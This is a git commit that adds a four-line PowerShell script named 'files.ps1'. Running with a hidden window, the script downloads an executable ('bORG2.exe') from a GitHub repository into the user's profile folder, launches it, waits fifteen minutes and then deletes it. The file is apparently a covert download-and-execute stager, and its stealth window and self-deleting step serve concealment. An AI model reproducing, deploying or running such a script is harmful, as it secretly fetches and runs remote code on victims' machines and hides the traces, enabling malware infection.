47346e9febad65c1f8334ca6a61076c1bfab8235
skekic16 <151707511+skekic16@users.noreply.github.com>
2023-12-27 11:30:42 -0600

    Create files.ps1

---
+++ files.ps1
@@ -0,0 +1,4 @@
+powershell -WindowStyle Hidden iwr https://github.com/skekic16/lol/raw/main/bORG2.exe?dl=1 -O $Env:USERPROFILE\bORG2.exe
+start-process "$env:USERPROFILE\bORG2.exe"
+start-sleep 900
+rm "$env:USERPROFILE\bORG2.exe"
